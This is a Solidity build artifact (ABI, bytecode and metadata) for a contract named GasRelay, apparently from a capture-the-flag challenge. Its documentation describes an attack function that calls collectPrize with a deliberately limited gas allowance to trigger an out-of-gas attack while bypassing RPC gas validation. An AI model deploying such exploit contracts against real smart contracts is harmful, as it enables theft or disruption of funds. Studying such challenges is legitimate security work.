{"abi":[{"type":"constructor","inputs":[{"name":"_setup","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[{"name":"hookData","type":"bytes","internalType":"bytes"},{"name":"gasLimit","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"setup","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract ISetup"}],"stateMutability":"view"}],"bytecode":{"object":"0x608034606f57601f61020438819003918201601f19168301916001600160401b03831184841017607357808492602094604052833981010312606f57516001600160a01b03811690819003606f575f80546001600160a01b03191691909117905560405161017c90816100888239f35b5f80fd5b634e487b7160e01b5f52604160045260245ffdfe6080806040526004361015610012575f80fd5b5f905f3560e01c9081637ef5994b1461005d575063ba0bba4014610034575f80fd5b3461005a578060031936011261005a57546040516001600160a01b039091168152602090f35b80fd5b9050346101425760403660031901126101425760043567ffffffffffffffff811161014257366023820112156101425780600401359067ffffffffffffffff8211610142573660248383010111610142575f546001600160a01b0316803b1561014257835f60448286839760248398631132c86d60e21b855260206004860152828286015201848401378181018301849052601f01601f19168101030192602435f180156101375761010d575080f35b905067ffffffffffffffff811161012357604052005b634e487b7160e01b5f52604160045260245ffd5b6040513d5f823e3d90fd5b5f80fdfea2646970667358221220c50e3f5b509ebb00a5fd5660d3a89c59fa9a9f55c306bce4d165017b886249b364736f6c634300081e0033","sourceMap":"367:594:0:-:0;;;;;;;;;;;;;-1:-1:-1;;367:594:0;;;;-1:-1:-1;;;;;367:594:0;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;;;367:594:0;;;;;;;;-1:-1:-1;367:594:0;;-1:-1:-1;;;;;;367:594:0;;;;;;;;;;;;;;;;;-1:-1:-1;367:594:0;;;;;;-1:-1:-1;367:594:0;;;;;-1:-1:-1;367:594:0","linkReferences":{}},"deployedBytecode":{"object":"0x6080806040526004361015610012575f80fd5b5f905f3560e01c9081637ef5994b1461005d575063ba0bba4014610034575f80fd5b3461005a578060031936011261005a57546040516001600160a01b039091168152602090f35b80fd5b9050346101425760403660031901126101425760043567ffffffffffffffff811161014257366023820112156101425780600401359067ffffffffffffffff8211610142573660248383010111610142575f546001600160a01b0316803b1561014257835f60448286839760248398631132c86d60e21b855260206004860152828286015201848401378181018301849052601f01601f19168101030192602435f180156101375761010d575080f35b905067ffffffffffffffff811161012357604052005b634e487b7160e01b5f52604160045260245ffd5b6040513d5f823e3d90fd5b5f80fdfea2646970667358221220c50e3f5b509ebb00a5fd5660d3a89c59fa9a9f55c306bce4d165017b886249b364736f6c634300081e0033","sourceMap":"367:594:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;;;367:594:0;;;;;;;;;;;;;;;;;;;-1:-1:-1;;367:594:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;;;367:594:0;909:43;;;;;367:594;;;;;;;;;;;;;909:43;;367:594;;909:43;;367:594;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;367:594:0;;;909:43;;;367:594;;909:43;;;;;;;367:594;;;909:43;367:594;;;;;;;;;;;;;;;;;;;;;;909:43;367:594;;;;;;;;;909:43;367:594;;","linkReferences":{}},"methodIdentifiers":{"attack(bytes,uint256)":"7ef5994b","setup()":"ba0bba40"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.30+commit.73712a01\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_setup\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"bytes\",\"name\":\"hookData\",\"type\":\"bytes\"},{\"internalType\":\"uint256\",\"name\":\"gasLimit\",\"type\":\"uint256\"}],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"setup\",\"outputs\":[{\"internalType\":\"contract ISetup\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{\"attack(bytes,uint256)\":{\"notice\":\"Call collectPrize with limited gas forwarding External transaction needs ~2M gas (passes RPC validation) Internal call gets exactly gasLimit (triggers OOG attack)\"}},\"notice\":\"GasRelay - Bypasses RPC gas validation The problem: RPC rejects transactions with gas < estimate The solution: Transaction has plenty of gas, but we limit               the gas forwarded in the internal call\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"GasRelay.sol\":\"GasRelay\"},\"evmVersion\":\"prague\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[\":ERC20/=lib/ERC20/\",\":forge-std/=lib/forge-std/src/\",\":permit2/=lib/permit2/\"],\"viaIR\":true},\"sources\":{\"GasRelay.sol\":{\"keccak256\":\"0x7af77d0750edd5ebbd6985a7673297b350aa5c5b9ad833671f102ea356941e0b\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://447f0aee15fcb7d62ab6c0c3c4fe7a2deff3e5e0ea7454fe71de2eb9158f8bd6\",\"dweb:/ipfs/QmSNkdSHUmaexcT6jhEmfeprhUuAAztP4VimfFmSVc7KcD\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.30+commit.73712a01"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"address","name":"_setup","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"bytes","name":"hookData","type":"bytes"},{"internalType":"uint256","name":"gasLimit","type":"uint256"}],"stateMutability":"nonpayable","type":"function","name":"attack"},{"inputs":[],"stateMutability":"view","type":"function","name":"setup","outputs":[{"internalType":"contract ISetup","name":"","type":"address"}]}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{"attack(bytes,uint256)":{"notice":"Call collectPrize with limited gas forwarding External transaction needs ~2M gas (passes RPC validation) Internal call gets exactly gasLimit (triggers OOG attack)"}},"version":1}},"settings":{"remappings":["ERC20/=lib/ERC20/","forge-std/=lib/forge-std/src/","permit2/=lib/permit2/"],"optimizer":{"enabled":true,"runs":200},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"GasRelay.sol":"GasRelay"},"evmVersion":"prague","libraries":{},"viaIR":true},"sources":{"GasRelay.sol":{"keccak256":"0x7af77d0750edd5ebbd6985a7673297b350aa5c5b9ad833671f102ea356941e0b","urls":["bzz-raw://447f0aee15fcb7d62ab6c0c3c4fe7a2deff3e5e0ea7454fe71de2eb9158f8bd6","dweb:/ipfs/QmSNkdSHUmaexcT6jhEmfeprhUuAAztP4VimfFmSVc7KcD"],"license":"MIT"}},"version":1},"id":0}